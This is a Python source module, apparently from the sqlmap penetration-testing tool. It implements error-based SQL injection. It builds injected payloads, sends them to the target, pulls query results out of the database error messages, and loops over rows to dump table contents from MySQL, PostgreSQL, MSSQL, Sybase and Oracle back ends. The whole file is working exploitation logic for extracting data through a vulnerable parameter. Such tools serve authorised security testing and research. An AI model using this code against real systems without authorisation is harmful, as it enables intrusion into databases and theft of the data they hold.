#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToSessionFile
from lib.core.common import extractRegexResult
from lib.core.common import initTechnique
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import randomInt
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.settings import FROM_TABLE
from lib.core.settings import MYSQL_ERROR_CHUNK_LENGTH
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.resume import resume

reqCount = 0

def __oneShotErrorUse(expression, field):
    global reqCount

    retVal = None
    offset = 1

    while True:
        check = "%s(?P<result>.*?)%s" % (kb.misc.start, kb.misc.stop)
        nulledCastedField = agent.nullAndCastField(field)
        if Backend.getIdentifiedDbms() == DBMS.MYSQL:
            nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, MYSQL_ERROR_CHUNK_LENGTH)

        # Forge the error-based SQL injection request
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector
        query = agent.prefixQuery(vector)
        query = agent.suffixQuery(query)
        injExpression = expression.replace(field, nulledCastedField, 1)
        injExpression = unescaper.unescape(injExpression)
        injExpression = query.replace("[QUERY]", injExpression)
        payload = agent.payload(newValue=injExpression)

        # Perform the request
        page, headers = Request.queryPage(payload, content=True)
        reqCount += 1

        # Parse the returned page to get the exact error-based
        # sql injection output
        output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(check, listToStrValue(headers.headers \
                if headers else None), re.DOTALL | re.IGNORECASE)

        if Backend.getIdentifiedDbms() == DBMS.MYSQL:
            if offset == 1:
                retVal = output
            else:
                retVal += output if output else ''

            if not (output and len(output) >= MYSQL_ERROR_CHUNK_LENGTH):
                break
            else:
                offset += MYSQL_ERROR_CHUNK_LENGTH
        else:
            retVal = output
            break

    dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(retVal)))

    return retVal

def __errorFields(expression, expressionFields, expressionFieldsList, expected=None, num=None, resumeValue=True):
    outputs = []
    origExpr = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        if resumeValue:
            output = resume(expressionReplaced, None)

        if not output or (expected == EXPECTED.INT and not output.isdigit()):
            if output:
                warnMsg = "expected value type %s, resumed '%s', " % (expected, output)
                warnMsg += "sqlmap is going to retrieve the value again"
                logger.warn(warnMsg)

            output = __oneShotErrorUse(expressionReplaced, field)

            if output is not None:
                logger.info("retrieved: %s" % output)

        if isinstance(num, int):
            expression = origExpr

        if output:
            output = output.replace(kb.misc.space, " ")

        if output is not None:
            outputs.append(output)

    return outputs

def errorUse(expression, expected=None, resumeValue=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(PAYLOAD.TECHNIQUE.ERROR)

    global reqCount

    count = None
    start = time.time()
    startLimit = 0
    stopLimit = None
    outputs = []
    untilLimitChar = None
    untilOrderChar = None
    reqCount = 0

    if resumeValue:
        output = resume(expression, None)
    else:
        output = None

    if output and (expected is None or (expected == EXPECTED.INT and output.isdigit())):
        return output

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry per time
    # NOTE: I assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in \
       expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_TABLE) \
       or (Backend.getIdentifiedDbms() in FROM_TABLE and not \
       expression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]))) \
       and "EXISTS(" not in expression.upper() and "(CASE" not in expression.upper()):

        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    startLimit = int(limitRegExp.group(int(limitGroupStart)))

                stopLimit = limitRegExp.group(int(limitGroupStop))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1
                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() == DBMS.ORACLE:
                limitCond = False
        else:
            limitCond = True

        # I assume that only queries NOT containing a "LIMIT #, 1"
        # (or similar depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if limitRegExp:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or similar, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    stopLimit += startLimit
                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    expression = expression[:untilLimitChar]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit
            elif dump:
                if conf.limitStart:
                    startLimit = conf.limitStart
                if conf.limitStop:
                    stopLimit = conf.limitStop

            # Count the number of SQL query entries output
            countFirstField = queries[Backend.getIdentifiedDbms()].count.query % expressionFieldsList[0]
            countedExpression = expression.replace(expressionFields, countFirstField, 1)

            if re.search(" ORDER BY ", expression, re.I):
                untilOrderChar = countedExpression.index(" ORDER BY ")
                countedExpression = countedExpression[:untilOrderChar]

            count = resume(countedExpression, None)

            if not count or not count.isdigit():
                _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
                count = __oneShotErrorUse(countedExpression, countedExpressionFields)

            if (not count or (count.isdigit() and int(count) == 0)):
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the used SQL query. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1
            elif isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            try:
                for num in xrange(startLimit, stopLimit):
                    output = __errorFields(expression, expressionFields, expressionFieldsList, expected, num, resumeValue)

                    if output and isinstance(output, list) and len(output) == 1:
                        output = output[0]

                    outputs.append(output)

            except KeyboardInterrupt:
                print
                warnMsg = "Ctrl+C detected in dumping phase"
                logger.warn(warnMsg)

    if not outputs:
        outputs = __errorFields(expression, expressionFields, expressionFieldsList)

    if outputs and isinstance(outputs, list) and len(outputs) == 1 and isinstance(outputs[0], basestring):
        outputs = outputs[0]

    duration = calculateDeltaSeconds(start)

    debugMsg = "performed %d queries in %d seconds" % (reqCount, duration)
    logger.debug(debugMsg)

    return outputs
